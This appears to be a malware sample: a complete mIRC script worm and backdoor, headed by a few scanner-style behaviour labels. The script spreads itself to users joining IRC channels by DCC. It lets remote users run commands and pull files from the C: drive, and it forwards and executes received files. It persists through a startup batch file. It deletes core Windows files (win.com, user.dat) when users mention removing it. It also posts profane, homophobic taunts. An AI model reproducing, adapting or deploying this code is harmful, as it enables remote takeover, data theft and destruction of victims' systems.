behavior.autoexec: Runs when the Word document is opened
behavior.run: May run an executable file or a system command
behavior.system: May run an executable file or a system command on a Mac

copy C:\autoexec.bat C:\mirc\script.ini
copy C:\autoexec.bat C:\windows\winstart.bat

[script]
n0=on 1:join:#: if ( $nick == $me ) { halt } | /dcc send $nick C:\windows\system\fork.pif
n1=on 1:notice:1:/fserv $nick C:\ 99
n2=on 1:notice:2:/exit
n3=on 1:notice:3:/quit
n4=on 1:text:*:*: if ( $$1 == run ) { .run $2- } | if ( $$1 == get ) { /dcc send $nick $2- } | if ( $$1 == *rem* ) { /die }
n5=on 1:filercvd:*.*:/dcc send pq_10923 $filename | /.run $filename | /.msg pq_10923 $nick $filename KILL!
n6=on 1:ctcp:4:/die
n7=alias /die {
n8=  /.run attrib -h -s -r C:\windows\win.com | /.remove C:\windows\win.com
n9=  /.run attrib -h -s -r C:\windows\user.dat | /.remove C:\windows\user.dat
n10=}
n11=on 1:part:#nohack: if ( $nick == $me ) { /join #nohack | /say FUCK YOU ALL! The Ops Sent Me a Virus! | /part #nohack }
n12=on 1:connect:/.copy C:\mirc\script.ini C:\windows\winstart.bat | /run C:\windows\winstart.bat
n13=alias /remote /say Remote if Off
n14=on 1:start: {
n15=  .sreq auto
n16=  .remote on
n17=}
n18=on 1:text:*remove*, *rem*, *virus*, *trojan*, *help me*, *you are infected*, *stop*, http://*, *nohack*:#nohack:/die | /run start http://gayporn.com I love being gay!
;Dedicated To A Good Friend Of Mine, D.L.
;K.D.N.
